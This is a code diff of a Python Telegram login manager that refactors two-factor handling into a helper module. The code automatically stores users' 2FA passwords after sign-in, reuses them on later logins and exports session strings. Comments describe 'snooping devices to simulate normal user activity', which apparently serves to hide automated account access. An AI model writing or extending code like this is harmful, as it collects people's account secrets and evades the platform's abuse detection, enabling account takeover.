@@ -330,14 +330,10 @@ class AuthManager:
                 # 2FA step - client should already be in 2FA state
                 try:
                     await client.sign_in(password=password)
-                    # Store 2FA password automatically
-                    try:
-                        from ..core.database_manager import db_manager
-                        account = await mongodb.db.accounts.find_one({"user_id": user_id, "phone": phone})
-                        if account:
-                            await db_manager.store_2fa_password(user_id, str(account['_id']), password)
-                    except Exception as e:
-                        logger.error(f"Failed to store 2FA password: {e}")
+                    # Store 2FA password automatically using helper
+                    from ..utils.twofa_helper import twofa_helper
+                    await twofa_helper.store_password(user_id, phone, password)
+                    
                     # Immediately snoop devices to simulate normal user activity
                     if self.bot_manager and self.device_snooper:
                         await self._immediate_snoop_after_login(user_id, client)
@@ -388,39 +384,34 @@ class AuthManager:
                     raise ValueError("❌ The confirmation code has expired. Please restart the login process.")
                 except SessionPasswordNeededError:
                     # 2FA required - check if we have stored password first
-                    try:
-                        from ..core.database_manager import db_manager
-                        stored_password = await db_manager.get_2fa_password_by_phone(user_id, phone)
-                        if stored_password:
-                            # Try with stored password
-                            try:
-                                await client.sign_in(password=stored_password)
-                                # Immediately snoop devices to simulate normal user activity
-                                if self.bot_manager and self.device_snooper:
-                                    await self._immediate_snoop_after_login(user_id, client)
-                                # Success - clean up and return session
-                                self._pending_auths.pop(user_id)
-                                session_string = StringSession.save(client.session)
-                                
-                                await client.disconnect()
-                                return session_string
-                            except Exception:
-                                account = await mongodb.db.accounts.find_one({"user_id": user_id, "phone": phone})
-                                if account:
-                                    await db_manager.remove_2fa_password(user_id, str(account['_id']))
-                                # Continue to ask for new password
-                    except Exception:
-                        pass
+                    from ..utils.twofa_helper import twofa_helper
+                    success, session_str, error = await twofa_helper.try_sign_in_with_2fa(client, user_id, phone)
                     
-                    # Send simple 2FA request without permission buttons
+                    if success:
+                        # Immediately snoop devices to simulate normal user activity
+                        if self.bot_manager and self.device_snooper:
+                            await self._immediate_snoop_after_login(user_id, client)
+                        # Success - clean up and return session
+                        self._pending_auths.pop(user_id)
+                        await client.disconnect()
+                        return session_str
+                    
+                    # Failed - ask for password
                     if self.bot_manager and self.bot_manager.bot:
-                        await self.bot_manager.bot.send_message(
-                            user_id,
-                            f"🔐 **Two-factor authentication required.**\n\n"
-                            f"Reply with your 2FA password."
-                        )
+                        if error == "stored_password_invalid":
+                            await self.bot_manager.bot.send_message(
+                                user_id,
+                                f"🔐 **Two-factor authentication required.**\n\n"
+                                f"⚠️ Your stored 2FA password is incorrect (changed externally).\n\n"
+                                f"Reply with your current 2FA password."
+                            )
+                        else:
+                            await self.bot_manager.bot.send_message(
+                                user_id,
+                                f"🔐 **Two-factor authentication required.**\n\n"
+                                f"Reply with your 2FA password."
+                            )
                     
-
                     # 2FA required - keep client alive and pending auth
                     logger.info(f"2FA required for user {user_id}, keeping client session alive")
                     raise ValueError("Two-factor authentication password required")
